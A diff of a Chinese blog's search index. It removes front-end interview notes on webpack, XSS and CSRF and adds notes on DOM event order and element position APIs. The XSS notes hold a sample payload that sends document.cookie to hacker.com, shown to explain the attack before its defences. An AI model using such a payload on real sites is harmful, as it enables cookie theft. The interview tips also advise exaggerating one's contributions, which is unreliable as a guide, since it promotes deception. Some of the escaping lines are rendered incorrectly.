-<li><strong>define-plugin：定义环境变量，在4-7区分环境中有介绍。</strong></li>
-<li>context-replacement-plugin：修改 require 语句在寻找文件时的默认行为。</li>
-<li>ignore-plugin：用于忽略部分文件。</li>
-</ul>
-</li>
-<li><p>用于优化</p>
-<ul>
-<li>commons-chunk-plugin：提取公共代码，在4-11提取公共代码中有介绍。</li>
-<li><strong>extract-text-webpack-plugin：提取 JavaScript 中的 CSS 代码到单独的文件中，在1-5使用 Plugin 中有介绍。</strong></li>
-<li>prepack-webpack-plugin：通过 Facebook 的 Prepack 优化输出的 JavaScript 代码性能，在 4-13使用 Prepack 中有介绍。</li>
-<li>uglifyjs-webpack-plugin：通过 UglifyES 压缩 ES6 代码，在 4-8压缩代码中有介绍。</li>
-<li>webpack-parallel-uglify-plugin：多进程执行 UglifyJS 代码压缩，提升构建速度。</li>
-<li><strong>imagemin-webpack-plugin：压缩图片文件。</strong></li>
-<li>webpack-spritesmith：用插件制作雪碧图。</li>
-<li>ModuleConcatenationPlugin：开启 Webpack Scope Hoisting 功能，在4-14开启 ScopeHoisting中有介绍。</li>
-<li>dll-plugin：借鉴 DDL 的思想大幅度提升构建速度，在4-2使用 DllPlugin中有介绍。</li>
-<li>hot-module-replacement-plugin：开启模块热替换功能。</li>
-</ul>
-</li>
-<li><p>其它</p>
-<ul>
-<li>serviceworker-webpack-plugin：给网页应用增加离线缓存功能，在3-14 构建离线应用中有介绍。</li>
-<li>stylelint-webpack-plugin：集成 stylelint 到项目中，在3-16检查代码中有介绍。</li>
-<li>i18n-webpack-plugin：给你的网页支持国际化。</li>
-<li>provide-plugin：从环境中提供的全局变量中加载模块，而不用导入对应的文件。</li>
-<li>web-webpack-plugin：方便的为单页应用输出 HTML，比 html-webpack-plugin 好用。</li>
-</ul>
-</li>
-<li><p>以上信息来自于<a href="https://webpack.wuhaolin.cn/%E9%99%84%E5%BD%95/%E5%B8%B8%E7%94%A8Plugins.html" target="_blank" rel="noopener">这里</a></p>
-</li>
-</ul>
-</li>
-<li><p>英语题：loader 和 plugin 的区别是什么？<br><a href="https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/308" target="_blank" rel="noopener">第 148 题： webpack 中 loader 和 plugin 的区别是什么</a></p>
-</li>
-</ol>
-<ul>
-<li>Plugin直译为”插件”。<strong>Plugin可以扩展webpack的功能</strong>，通过在构建流程里注入钩子实现,让webpack具有更多的灵活性。<ul>
-<li>它丰富了webpack本身，<strong>针对是loader结束后</strong>，webpack打包的整个过程，<strong>它并不直接操作文件</strong>，而是基于事件机制工作，会监听webpack打包过程中的某些节点，执行广泛的任务</li>
-</ul>
-</li>
-<li>Loader直译为”加载器”。<strong>webpack原生是只能解析js文件，如果想将其他文件也打包的话，就会用到loader。 所以Loader的作用是让webpack拥有了加载和解析非JavaScript文件的能力。</strong></li>
-</ul>
-<ol start="3">
-<li><strong>必考</strong>：如何按需加载代码？</li>
-</ol>
-<ul>
-<li>其实就是上面的 路由懒加载。  <ul>
-<li>路由懒加载说道import后面括号加上组件路径即可,比如,这里返回的是Promise，可以继续点then  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">'./Foo.vue'</span>) <span class="comment">// 返回 Promise</span></span><br></pre></td></tr></table></figure></li>
-<li>可以参考这里<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-12%E6%8C%89%E9%9C%80%E5%8A%A0%E8%BD%BD.html" target="_blank" rel="noopener">4-12 分割代码按需加载</a></li>
-<li>详细一点的说明<br>  单页应用的按需加载 现在很多前端项目都是通过单页应用的方式开发的，但是随着业务的不断扩展，会面临一个严峻的问题——首次加载的代码量会越来越多，影响用户的体验。<ul>
-<li><strong>通过import()语句来控制加载时机</strong>，webpack内置了对于import(<em>)的解析，会将import(</em>)中引入的模块作为一个新的入口在生成一个chunk。 当代码执行到import(<em>)语句时，会去加载Chunk对应生成的文件。*</em>import()会返回一个Promise对象**，所以为了让浏览器支持，需要事先注入Promise polyfill</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<ol start="4">
-<li><strong>必考</strong>：如何提高构建速度？<ol>
-<li>使用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-3%E4%BD%BF%E7%94%A8HappyPack.html" target="_blank" rel="noopener">Happypack</a> 实现多线程加速编译打包</li>
-<li>使用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-4%E4%BD%BF%E7%94%A8ParallelUglifyPlugin.html" target="_blank" rel="noopener">webpack-uglify-parallel</a>来提升uglifyPlugin的压缩速度。 原理上webpack-uglify-parallel采用了多核并行压缩来提升压缩速度</li>
-<li>利用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-2%E4%BD%BF%E7%94%A8DllPlugin.html" target="_blank" rel="noopener">DllPlugin</a>和DllReferencePlugin预编译资源模块 通过DllPlugin来对那些我们引用但是绝对不会修改的npm包来进行预编译，再通过DllReferencePlugin将预编译的模块加载进来。</li>
-<li>多入口情况下，使用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-11%E6%8F%90%E5%8F%96%E5%85%AC%E5%85%B1%E4%BB%A3%E7%A0%81.html" target="_blank" rel="noopener">CommonsChunkPlugin来提取公共代码</a></li>
-</ol>
-<ul>
-<li>简单记忆——h(<strong>Happypack</strong>)p(webpack-uglify-<strong>parallel</strong>)c(<strong>CommonsChunkPlugin</strong>)d(<strong>DllPlugin</strong>)</li>
-</ul>
-</li>
-<li>转义出的文件过大怎么办？（也就是提高性能）<ol>
-<li>上面的使用<a href="https://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-11%E6%8F%90%E5%8F%96%E5%85%AC%E5%85%B1%E4%BB%A3%E7%A0%81.html" target="_blank" rel="noopener">CommonsChunkPlugin来提取公共代码</a>就可以处理文件过大的问题。</li>
-<li>压缩js,css和图片。</li>
-<li>动态加载的方式——懒加载(import()),前面说过。</li>
-</ol>
-<ul>
-<li>上面的是参考了部分的这里的<a href="https://www.cnblogs.com/vvjiang/p/9327903.html" target="_blank" rel="noopener">回答——webpack打包经验——处理打包文件体积过大的问题</a></li>
-</ul>
-</li>
-</ol>
-<p>上面五题请看<a href="https://zhuanlan.zhihu.com/p/44438844" target="_blank" rel="noopener">这个不错的参考</a></p>
-<h2 id="安全（老师说现在前端考的很少了）"><a href="#安全（老师说现在前端考的很少了）" class="headerlink" title="安全（老师说现在前端考的很少了）"></a>安全（老师说现在前端考的很少了）</h2><ol>
-<li><strong>必考</strong>：什么是 XSS？如何预防？<ul>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting" target="_blank" rel="noopener">XSS(Cross-site_scripting)</a>就是跨站脚本攻击</li>
-<li>举例  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.innerHTML = userComment  <span class="comment">// userComment 内容是 &lt;script&gt;$.get('http://hacker.com?cookie='+document.cookie)&lt;/script&gt;</span></span><br><span class="line"><span class="comment">// 恶意就被执行了，这就是 XSS</span></span><br></pre></td></tr></table></figure></li>
-<li>预防<ul>
-<li>不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行</li>
-<li>如果你一样要用 innerHTML，字符过滤,详细见这个<a href="https://www.w3school.com.cn/html/html_entities.asp" target="_blank" rel="noopener">网址——HTML 字符实体</a><ul>
-<li>把 &lt; 替换成 &lt;</li>
-<li>把 &gt; 替换成 &gt;</li>
-<li>把 &amp; 替换成 &amp;</li>
-<li>把 ‘ 替换成 &#39;</li>
-<li>把 ‘ 替换成 &quot;</li>
-<li>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</li>
-</ul>
-</li>
-<li>使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">CSP Content Security Policy</a><br>更多信息请看<a href="https://zhuanlan.zhihu.com/p/22500730" target="_blank" rel="noopener">方方的文章</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>必考</strong>：什么是 CSRF？如何预防？<ul>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF" target="_blank" rel="noopener">CSRF(Cross-Site Request Forgery)跨站请求伪造</a></li>
-<li>过程<ul>
-<li>用户在 qq.com 登录</li>
-<li>用户切换到 hacker.com（恶意网站）</li>
-<li>hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。</li>
-<li>用户在不知不觉中添加 hacker 为好友。</li>
-<li>用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。</li>
-</ul>
-</li>
-<li>避免<ul>
-<li>检查 referer，qq.com 可以拒绝来自 hacker.com 的请求</li>
-<li>csrf_token 来解决<br>更多信息请看<a href="https://zhuanlan.zhihu.com/p/22521378" target="_blank" rel="noopener">若愚的文章</a><h2 id="开放题目"><a href="#开放题目" class="headerlink" title="开放题目"></a>开放题目</h2></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>必考</strong>：你遇到最难的问题是怎样的？<ol>
-<li>可以用小程序的<a href="https://developers.weixin.qq.com/community/develop/doc/000aa6b1d3cf28f55fc914da656400" target="_blank" rel="noopener">wx.reLaunch(Object object)通过url传参数的问题</a>，只能传query吗？这个传值问题<ul>
-<li>最开始我想实现从历史页面的点击翻译信息跳转到翻译页面显示要翻译的信息和翻译后的信息。但是我用onShow这个函数处理只能获取到query，也就是需要翻译的信息，获取不到翻译后的信息，</li>
-<li>我先是在百度和Google上搜索了相关问题，找到一些解决方案是说建议传参和传参进行编码和解码 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/decodeURI" target="_blank" rel="noopener">decode</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/encodeURI" target="_blank" rel="noopener">encode</a>，但是还是解决不了。</li>
-<li>然后我又去微信开发社区提问，然后经过一段事件后有一个社友告诉我<a href="https://developers.weixin.qq.com/miniprogram/dev/api/route/wx.reLaunch.html" target="_blank" rel="noopener">wx.reLaunch</a>的传参只能传给<a href="https://developers.weixin.qq.com/miniprogram/dev/reference/api/Page.html#onLoad-Object-query" target="_blank" rel="noopener">onLoad</a>，不能传给<a href="https://developers.weixin.qq.com/miniprogram/dev/reference/api/Page.html#onShow" target="_blank" rel="noopener">onShow</a>。然后我又仔细看了下标准文档里面确实是这么说的</li>
-<li>我之前一直都是在onShow里面获取参数，所以一直获取不到，后面改到onLoad里面终于能够获取参数了，然后解决了。</li>
-<li>最后我把这个代码和笔记公开到github上面</li>
-</ul>
-</li>
-<li>setTimeout和nextTick的问题。<ul>
-<li>就是popover这个组件在做的时候，我考虑到点击弹出这个popover，然后再点击弹出别的地方的时候关闭这个popover这个功能。这里用到<a href="https://cn.vuejs.org/v2/guide/conditional.html#v-if" target="_blank" rel="noopener">v-if的true就是现实，false就是关闭</a>，这里需要用异步操作，那么我最开始是使用$nextTick这个异步操作，是起作用的。</li>
-<li>但是有一天我更新了Vue,然后这里就不起作用了，但是我不知道是因为更新Vue版本的问题，后面我就改成了setTimeout就又可以完成这个功能了。</li>
-<li>后面我就是通过google和segmentfault（思否）找原因，然后找到可能是不同版本的Vue的$nextTick的功能有一些不一样。然后我就版本更改到之前的版本，于是又可以实现功能了。</li>
-</ul>
-</li>
-<li>Chrome重新安装后<a href="https://github.com/bomber063/DIY-UI-frame-by-Vue" target="_blank" rel="noopener">测试报错</a>——这个我觉得可以不用说了，有前面两个就够了。</li>
-</ol>
-<ul>
-<li><strong>要点：一波三折</strong>。参考<a href="https://www.zhihu.com/question/35323603" target="_blank" rel="noopener">知乎回答</a></li>
-</ul>
-</li>
-<li>你在团队的突出贡献是什么？  <ul>
-<li>把小事说大。<ol>
-<li>没有团队就说所有项目都是一个人开发的</li>
-<li>如果有团队或者在小公司，那么就可以说：比如（如果代码不是很厉害的话）<ol>
-<li>每周组织前端分享会，帮助其他成员成长。（实际情况可能在公司只分享了两次，第一次可能是leader强制要求大家分享。第二次就是自己主动去做的）</li>
-</ol>
-</li>
-</ol>
-</li>
-</ul>
-</li>
-<li>最近在关注什么新技术<br> 一般可以回答前端前辈关注什么就关注什么，比如方应杭，微博的阮一峰，尤雨溪，还有英文的一些前端知识<br>书、博客、推特、知乎，不要说 CSDN、百度。</li>
-<li>有没有看什么源码，看了后有什么记忆深刻的地方，有什么收获<br><strong>看过源码说源码</strong>，推荐看 underscore.js 的源码<br><strong>没看过源码就说同事的代码</strong>，代码烂就说哪里烂，代码好就说哪里好<br>收获：<strong>命名规范、设计模式</strong>，命名规范比较简单，命名规范很重要。变量命名对代码可读性很有帮助。 设计模式和造轮子的思想就相对复杂一点。 <h2 id="刁钻题目"><a href="#刁钻题目" class="headerlink" title="刁钻题目"></a>刁钻题目</h2></li>
-<li>代码   <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="built_in">parseInt</span>)</span><br></pre></td></tr></table></figure>
-答案  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>  </span><br><span class="line"><span class="literal">NaN</span>  </span><br><span class="line"><span class="literal">NaN</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>解析<ul>
-<li>上面的代码可以需要用到两个知识，一个是<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map" target="_blank" rel="noopener">map()函数</a>，另一个是<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/parseInt" target="_blank" rel="noopener">parseInt()函数</a></li>
-<li>parseInt是可以<strong>传两个参数</strong>，一个是需要转换的信息，另一个是按照多少进制转换。</li>
-<li>map是可以<strong>传一个函数，但是这个函数可以传三个参数</strong>，第一个是数组中正在处理的当前元素，第二是索引，第三个是map方法调用的数组本身。</li>
-<li>上面的代码可以拆分为下面的  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseInt(1,0)&#x2F;&#x2F;根据文档前面是1，后面是0，这个就代表把1按照十进制转换</span><br><span class="line">parseInt(2,1)&#x2F;&#x2F;把2按照1进制转换，那么就是NaN</span><br><span class="line">parseInt(3,2)&#x2F;&#x2F;把2按照2进制转换，就是NaN</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>代码   <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">name</span>: <span class="string">'a'</span>&#125;</span><br><span class="line">a.x = a = &#123;&#125;</span><br></pre></td></tr></table></figure>
- 问 a.x 是多少？<br>答案<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>因为右边的a已经被重新赋值为空对象。左边的a是另外一个a，这里先执行点操作符，然后再赋值。所以就是undefined。详细可以看我之前的<a href="https://zhuanlan.zhihu.com/p/59835538" target="_blank" rel="noopener">笔记——JS类型转换、内存图、GC、深/浅拷贝</a></li>
-</ul>
-</li>
-<li>(a ==1 &amp;&amp; a== 2 &amp;&amp; a==3) 可能为 true 吗？<br>利用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Equality_comparisons_and_sameness" target="_blank" rel="noopener">==</a> 会调用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf" target="_blank" rel="noopener">valueOf()</a> 和<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString" target="_blank" rel="noopener">toString()</a>的特性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line"> value: <span class="number">1</span>,</span><br><span class="line"> valueOf()&#123;<span class="comment">//这里改成toString()也可以实现</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.value++</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">a ==<span class="number">1</span> &amp;&amp; a== <span class="number">2</span> &amp;&amp; a==<span class="number">3</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>学习参考<a href="https://codeburst.io/javascript-can-a-1-a-2-a-3-ever-evaluate-to-true-aca13ff4462d" target="_blank" rel="noopener">JavaScript: Can (a==1 &amp;&amp; a==2 &amp;&amp; a==3) ever evaluate to true?</a><br>利用 a 会读取 window.a 的特性,这里用到<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty" target="_blank" rel="noopener">Object.defineProperty()</a>,这里就算<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Equality_comparisons_and_sameness" target="_blank" rel="noopener">三个等于的严格等于号</a>也可以实现<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> value = <span class="number">1</span>; </span><br><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">'a'</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> value++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">a ==<span class="number">1</span> &amp;&amp; a== <span class="number">2</span> &amp;&amp; a==<span class="number">3</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 或者 </span></span><br><span class="line">a ===<span class="number">1</span> &amp;&amp; a=== <span class="number">2</span> &amp;&amp; a===<span class="number">3</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ol>
-<ul>
-<li>测试结果可以<a href="https://jsbin.com/nedotujoke/1/edit?js,output" target="_blank" rel="noopener">看这里</a></li>
+<h2 id="当前面的增加类为true，后面的移除类为false的时候"><a href="#当前面的增加类为true，后面的移除类为false的时候" class="headerlink" title="当前面的增加类为true，后面的移除类为false的时候"></a>当前面的增加类为true，后面的移除类为false的时候</h2><ul>
+<li>增加类在延迟函数(setTimeout)里面是<strong>捕获阶段执行</strong>,移除类在延迟函数(setTimeout)里面<strong>冒泡阶段执行</strong>。DOM事件模型都是<strong>先捕获在冒泡</strong>。</li>
+<li><strong>除了最内层外，其他DIV没有在同一个DIV绑定两个事件</strong>，跟<strong>代码顺序没有关系</strong>，但是<strong>最内层</strong>DIV在同一个DIV<strong>绑定两个事件</strong>，此时就跟<strong>代码顺序相关</strong>，代码在前面的就先执行，就是<strong>队列模型</strong>，所以<strong>最外层</strong>会先增加类，也就是最开始从外层到内侧依次增加颜色，到<strong>最内层</strong>的时候，由于事件绑定了同一个DIV，那么就是按照<strong>代码先后顺序执行</strong>，也就是先增加最内层的类，然后最内层移除类，也就是到<strong>最内层</strong>的时候会<strong>先变色</strong>，然后<strong>移除该层颜色</strong>，然后从<strong>内部第二层</strong>开始从内向外部，也就是冒泡阶段增加类来添加颜色。</li>
+<li>jsbin代码<a href="http://js.jirengu.com/zecojimibu/1/edit?html,css,js,output" target="_blank" rel="noopener">链接</a></li>
 </ul>
 ]]></content>
+      <categories>
+        <category>DOM</category>
+      </categories>
+      <tags>
+        <tag>DOM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>部分位置API测试</title>
+    <url>/2019/12/04/%E9%83%A8%E5%88%86%E4%BD%8D%E7%BD%AEAPI%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  前面已经测试过部分位置信息了。<br>  <a id="more"></a><br>  <a href="https://zhuanlan.zhihu.com/p/62483585" target="_blank" rel="noopener">Top和Y的部分API测试笔记（一）</a><br>  <a href="https://zhuanlan.zhihu.com/p/62514240" target="_blank" rel="noopener">Top和Y的部分API测试笔记（二）</a><br>  <a href="https://zhuanlan.zhihu.com/p/62519712" target="_blank" rel="noopener">Top和Y的部分API测试笔记（三）和总结</a><br>  今天在做Vue轮子项目的popover组件的时候发现还不够熟悉，直接再写一篇博客加深影响。</p>
+<ul>
+<li>这次测试信息包括：<ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect" target="_blank" rel="noopener">getBoundingClientRect</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/scrollY" target="_blank" rel="noopener">window.scrollY</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/offsetTop" target="_blank" rel="noopener">offsetTop</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollHeight" target="_blank" rel="noopener">scrollHeight</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollTop" target="_blank" rel="noopener">scrollLeft</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollTop" target="_blank" rel="noopener">scrollTop</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/clientHeight" target="_blank" rel="noopener">clientHeight</a><h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><h3 id="HTML代码-不是重点可以不用看"><a href="#HTML代码-不是重点可以不用看" class="headerlink" title="HTML代码(不是重点可以不用看)"></a>HTML代码(不是重点可以不用看)</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span>111111111sdfsdfdfsdfsdfsdf111111111111111111111111111111111111111<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"b"</span>&gt;</span>啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"c"</span>&gt;</span>11111111<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="CSS代码-不是重点可以不用看"><a href="#CSS代码-不是重点可以不用看" class="headerlink" title="CSS代码(不是重点可以不用看)"></a>CSS代码(不是重点可以不用看)</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">  <span class="attribute">padding</span>:<span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>:relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#a</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">1000px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: scroll;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#b</span>&#123;</span><br><span class="line">  <span class="comment">/* border:1px solid blue; */</span></span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: scroll;</span><br><span class="line">  <span class="attribute">position</span>:relative;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#c</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">1px</span> solid green;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: scroll;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="JavaScript代码（主要测试对象）"><a href="#JavaScript代码（主要测试对象）" class="headerlink" title="JavaScript代码（主要测试对象）"></a>JavaScript代码（主要测试对象）</h3></li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><p>第一个测试，主要是测试 getBoundingClientRect返回的属性，它是相对于视口</p>
+ <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// console.log(width,height,'b元素距离顶部为'+top,left)</span></span><br><span class="line">b.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span>&#123;width,height,top,left&#125;=b.getBoundingClientRect();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'top为'</span>+top)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  上面是第一个测试，主要是测试 getBoundingClientRect返回的属性，它是相对于视口.</span></span><br><span class="line"><span class="comment">// 注意这里每次点击之后都需要获取值，所以要写到function里面。</span></span><br></pre></td></tr></table></figure></li>
+<li><p>window.scrollY,offsetTop,scrollHeight及getBoundingClientRect返回值之间的关系，这里用到了ES6的语法。因为我的浏览器还存在小数，所以用了四舍五入Math.round()。</p>
+<ul>
+<li>关系测试了两种。分别为：<ul>
+<li>2-1.这只有在竖直方向的竖条没有移动的前提下才满足的情况，也就再最上面的时候</li>
+<li>2-2.在任何条件都可以满足的情况</li>
+</ul>
+</li>
+<li>两种情况看下面代码的注释及<a href="https://jsbin.com/wuhawekose/1/edit?css,js,output" target="_blank" rel="noopener">JSbin代码链接</a>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span>&#123;width,height,top,left&#125;=b.getBoundingClientRect();</span><br><span class="line">  top=<span class="built_in">Math</span>.round(top)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> &#123;<span class="attr">height</span>:cHeight&#125;=c.getBoundingClientRect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bodyHeight=<span class="built_in">document</span>.body.scrollHeight;</span><br><span class="line"><span class="keyword">let</span> bodyWidth=<span class="built_in">document</span>.body.scrollWidth;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'document.body.scrollHeight为'</span>+bodyHeight)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'document.body.scrollWidth为'</span>+bodyWidth)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'top+window.scrollY求和为'</span>+(top+<span class="built_in">window</span>.scrollY))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'window.scrollY为'</span>+<span class="built_in">Math</span>.round(<span class="built_in">window</span>.scrollY))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'top为'</span>+top)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'height为'</span>+height)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'cHeight为'</span>+cHeight)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b.offsetTop为'</span>+b.offsetTop)</span><br><span class="line"><span class="comment">//整个页面的高度-c元素的高度-b元素的高度===b元素距离视口上边距的距离</span></span><br><span class="line"><span class="comment">// 这只有在竖直方法的竖条没有移动的前提下才满足，也就再最上面的时候</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.body.scrollHeight-cHeight-height===top)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'这只有在竖直方向的竖条没有移动的前提下才满足'</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'document.body.scrollHeight-cHeight-height===top成功'</span>)</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//整个页面的高度-c元素的高度-b元素的高度-整个页面竖直方向滚动条移动的距离===b元素距离视口上边距的距离</span></span><br><span class="line"><span class="comment">// 这个在任何条件都可以满足。</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">document</span>.body.scrollHeight-cHeight-height-<span class="built_in">Math</span>.round(<span class="built_in">window</span>.scrollY)===top)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'这个在任何条件都可以满足'</span>)</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'document.body.scrollHeight-cHeight-height-Math.round(window.scrollY)===top成功'</span>)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//b元素距离视口上边距的距离+垂直方向滚动的距离===b元素顶部相对于其offsetParent元素的顶部的距离</span></span><br><span class="line"><span class="comment">// 任何条件都可以满足。</span></span><br><span class="line">  <span class="keyword">if</span>(top+<span class="built_in">window</span>.scrollY===b.offsetTop)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'任何条件都可以满足'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'top+window.scrollY===b.offsetTop成功'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//上面主要测试window.scrollY,offsetTop,scrollHeight</span></span><br><span class="line"><span class="comment">// 及getBoundingClientRect返回值之间的关系。</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>测试scrollLeft和scrollTop</p>
